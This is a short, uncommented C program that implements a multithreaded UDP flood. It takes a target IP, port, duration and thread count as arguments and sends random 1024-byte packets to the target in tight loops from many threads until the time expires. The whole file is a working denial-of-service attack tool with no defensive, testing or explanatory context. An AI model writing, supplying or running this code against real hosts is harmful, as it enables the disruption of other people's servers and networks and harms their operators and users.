#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>

struct target_data { char *ip; int port; int time; };

void *flood(void *arg) {
    struct target_data *data = (struct target_data *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in serv;
    char payload[1024]; 
    for(int i=0; i<1024; i++) payload[i] = rand() % 256;

    serv.sin_family = AF_INET;
    serv.sin_port = htons(data->port);
    serv.sin_addr.s_addr = inet_addr(data->ip);

    time_t end = time(NULL) + data->time;
    while(time(NULL) < end) {
        sendto(sock, payload, 1024, 0, (struct sockaddr *)&serv, sizeof(serv));
    }
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc != 5) return 1;
    int threads = atoi(argv[4]);
    pthread_t t[threads];
    struct target_data data = {argv[1], atoi(argv[2]), atoi(argv[3])};

    for(int i=0; i<threads; i++) pthread_create(&t[i], NULL, flood, &data);
    for(int i=0; i<threads; i++) pthread_join(t[i], NULL);
    return 0;
}